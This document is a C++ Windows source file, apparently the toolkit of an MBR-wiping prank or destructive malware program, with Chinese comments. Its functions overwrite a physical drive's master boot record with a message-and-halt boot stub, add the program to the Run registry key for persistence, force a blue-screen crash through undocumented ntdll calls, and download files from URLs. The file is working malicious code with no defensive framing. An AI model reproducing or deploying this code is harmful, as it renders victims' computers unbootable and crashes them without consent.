#include"std.h"


using namespace std;

bool GetPrivileges()
{
	//定义一个PLUID
	HANDLE hProcess;
	HANDLE hTokenHandle;
	TOKEN_PRIVILEGES tp;
	hProcess = GetCurrentProcess();//获取当前进程的句柄

	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenHandle);
	//函数查看系统权限的特权值，返回信息到一个LUID结构体里。
	tp.PrivilegeCount = 1;
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	bool retn;
	retn=AdjustTokenPrivileges(hTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL)==TRUE;
	CloseHandle(hTokenHandle);
	CloseHandle(hProcess);
	if (GetLastError() != ERROR_SUCCESS)
		return false;
	return retn;
}

//写MBR
bool WritePhydriveMBR(unsigned int id,string msgstr)
{
	#pragma warning(push)
	#pragma warning (disable:4309 4838)
	static char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*字符位数*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
	#pragma warning(pop)
	static bool isfirstuse=true;
	if (isfirstuse)
	{//初始化MBR
		//改MBR中字符位数
		pMBR[9] = static_cast<char>(msgstr.size());
		//加循环逻辑锁————已弃用！！！仅Win9x下有效果！！！
		//pMBR[0x1BF] = 0x00;
		//pMBR[0x1C2] = 0x05;
		//加结尾
		pMBR[510] = static_cast<char>(0x55);
		pMBR[511] = static_cast<char>(0xAA);
		//把提示字符写入MBR
		strcpy_s(reinterpret_cast<char *>(pMBR + 24), 512, msgstr.c_str());
		isfirstuse = false;
	}

	//计算硬盘文件名称
	wstringstream wss;
	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
	//打开
	HANDLE hFile;
	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//用readfile来读取MBR
	bool retn = WriteFile(hFile, pMBR, 512, NULL, NULL) == TRUE;
	CloseHandle(hFile);
	return retn;
}

//读MBR
string ReadPhydriveMBR(unsigned int id)
{
	
	char pMBR[512] = {};
	wstringstream wss;
	//计算硬盘文件名称
	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
	//打开
	HANDLE hFile;
	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//用readfile来读取MBR
	DWORD dwReadSize;
	
	bool r_flag = ReadFile(hFile, pMBR, 512, &dwReadSize, NULL) == TRUE;
	CloseHandle(hFile);
	if (r_flag)
		return static_cast<string>(pMBR);
	else
		return static_cast<string>("");
}


//注册自启动
bool RegAutoStart(wstring name)
{
	HKEY hKey;
	const TCHAR *strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	//1、找到系统的启动项  
	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///打开启动项       
	{
		//2、得到本程序自身的全路径
		TCHAR strExeFullDir[MAX_PATH];
		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
		//3、判断注册表项是否已经存在
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		//4、已经存在
		if (RegGetValue(hKey, nullptr, name.c_str(), RRF_RT_REG_SZ, 0, strDir, &nLength) != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
		{
			bool retn = false;
			//5、添加一个子Key,并设置值
			retn=RegSetValueEx(hKey, name.c_str(), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR)) == ERROR_SUCCESS;
			//6、关闭注册表
			RegCloseKey(hKey);
			return retn;
		}
		else
			return true;
	}
	return false;
}

//蓝屏函数
bool MakeBlueScreen(unsigned int errid)
{
	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));
	if (ntdll != NULL)
	{
		FARPROC RtlAdjPriv = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC RtlSetProcessIsCritical = GetProcAddress(ntdll, "RtlSetProcessIsCritical");
		FARPROC ZwRaiseHardErr = GetProcAddress(ntdll, "ZwRaiseHardError");//获取蓝屏函数
		unsigned char ErrKill;
		long unsigned int HDErr;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(errid, 0, 0, 0, 6, &HDErr);
		FreeLibrary(ntdll);
	}
	return false;
}


void PlaySoundFile(wstring soundname,bool sync)
{
	PlaySound(soundname.c_str(), NULL, SND_FILENAME | (sync? SND_SYNC :SND_ASYNC) | SND_LOOP);
}

bool DownloadFileFromURL(std::wstring url, std::wstring filepath)
{
	return ((URLDownloadToFile(NULL, url.c_str(), filepath.c_str(), 0, NULL)) == S_OK);
}


//从URL获取字符串
std::wstring GetDataFromURL(std::wstring url, bool& iserr)
{
	CInternetSession session;
	CHttpFile* file = NULL;
	CString strURL = url.c_str();//URL
	CString strHtml = _T("");	//存放网页数据
	try
	{
		file = (CHttpFile*)session.OpenURL(strURL);
	}
	catch (CInternetException* m_pException)
	{
		file = NULL;
		m_pException->m_dwError;
		m_pException->Delete();
		session.Close();
		iserr = true;
		return std::wstring();
	}

	CString strLine;

	if (file != NULL)
	{
		while (file->ReadString(strLine) != NULL)
		{
			strHtml += strLine;
		}
	}
	else
	{
		return std::wstring();
	}
	session.Close();
	file->Close();
	delete file;
	file = NULL;
	iserr = false;
	return std::wstring(strHtml);
}